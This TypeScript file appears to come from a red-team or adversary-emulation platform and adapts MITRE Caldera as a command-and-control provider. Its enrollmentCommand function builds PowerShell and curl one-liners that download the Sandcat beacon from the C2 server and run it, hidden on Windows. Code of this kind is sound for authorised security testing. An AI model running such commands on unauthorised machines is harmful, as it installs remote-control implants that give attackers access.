/**
 * Caldera C2 provider — wraps the existing v2 REST adapter
 * (src/lib/enterprise-use-cases/caldera-runner.ts) so the C2Server model reuses
 * the exact health/run logic the enterprise-use-case runner already uses.
 */

import type { C2Server } from "@/generated/prisma/client";
import type { C2Provider, C2Beacon, C2Health, C2Os, C2DeployOpts, C2DeployResult } from "../types";
import {
  resolveCalderaConfig, calderaHealthCfg, listCalderaAgents, runCalderaCfg,
} from "@/lib/enterprise-use-cases/caldera-runner";

function cfgOf(server: C2Server) {
  return resolveCalderaConfig({
    url: server.url,
    apiKeyEnc: server.apiKeyEnc,
    group: server.group,
    agentPlatform: server.agentPlatform,
  });
}

/** The URL beacons call home to — the advertised LAN host wins over the API URL. */
function beaconServer(server: C2Server): string {
  const base = (server.url || "").trim().replace(/\/+$/, "");
  if (server.advertiseHost) {
    try { const u = new URL(base); return `${u.protocol}//${server.advertiseHost}:${u.port || 8888}`; } catch { /* fall through */ }
  }
  return base;
}

export const calderaProvider: C2Provider = {
  kind: "caldera",
  displayName: "MITRE Caldera",
  docsUrl: "https://caldera.readthedocs.io/",
  available: true,
  canDeploy: true,

  async health(server: C2Server): Promise<C2Health> {
    const c = cfgOf(server);
    if (!c.ok) return { ok: false, error: c.reason };
    return calderaHealthCfg(c.cfg);
  },

  async listAgents(server: C2Server): Promise<C2Beacon[]> {
    const c = cfgOf(server);
    if (!c.ok) return [];
    const agents = await listCalderaAgents(c.cfg).catch(() => []);
    return agents.map((a: any) => ({
      id: a?.paw || a?.unique || "",
      host: a?.host || a?.hostname || "",
      platform: a?.platform || "",
      username: a?.username || "",
      privilege: a?.privilege || "",
      lastSeen: a?.last_seen || a?.lastSeen || "",
      // Caldera marks a beacon "trusted"/alive via last_seen; treat recent as online.
      online: !!(a?.trusted ?? true),
    }));
  },

  enrollmentCommand(server: C2Server, os: C2Os): string {
    const s = beaconServer(server);
    const group = server.group || "red";
    if (os === "windows") {
      // Pull the Sandcat beacon from the C2 over the LAN (no internet), run it hidden.
      return [
        `$server="${s}";`,
        `$url="$server/file/download";`,
        `$wc=New-Object System.Net.WebClient;`,
        `$wc.Headers.add("platform","windows");`,
        `$wc.Headers.add("file","sandcat.go");`,
        `$data=$wc.DownloadData($url);`,
        `[io.file]::WriteAllBytes("C:\\Users\\Public\\sandcat.exe",$data) | Out-Null;`,
        `Start-Process -FilePath C:\\Users\\Public\\sandcat.exe -ArgumentList "-server $server -group ${group} -v" -WindowStyle hidden;`,
      ].join(" ");
    }
    const platform = os === "darwin" ? "darwin" : "linux";
    return [
      `server="${s}";`,
      `curl -s -X POST -H "file:sandcat.go" -H "platform:${platform}" $server/file/download > /tmp/sandcat.go;`,
      `chmod +x /tmp/sandcat.go;`,
      `/tmp/sandcat.go -server $server -group ${group} -v &`,
    ].join(" ");
  },

  async runTechnique(server, step, timeoutMs) {
    const c = cfgOf(server);
    if (!c.ok) return { status: "stubbed", exitCode: -1, stdout: "", stderr: "", durationMs: 0, notes: `Caldera not configured: ${c.reason}` };
    return runCalderaCfg(c.cfg, step, timeoutMs);
  },

  async deploy(opts: C2DeployOpts): Promise<C2DeployResult> {
    // Managed deploy lives in ../deploy-caldera to keep node-only (fs/child_process)
    // concerns out of this thin adapter; imported lazily so pure-API paths stay light.
    const { deployCaldera } = await import("../deploy-caldera");
    return deployCaldera(opts);
  },
};
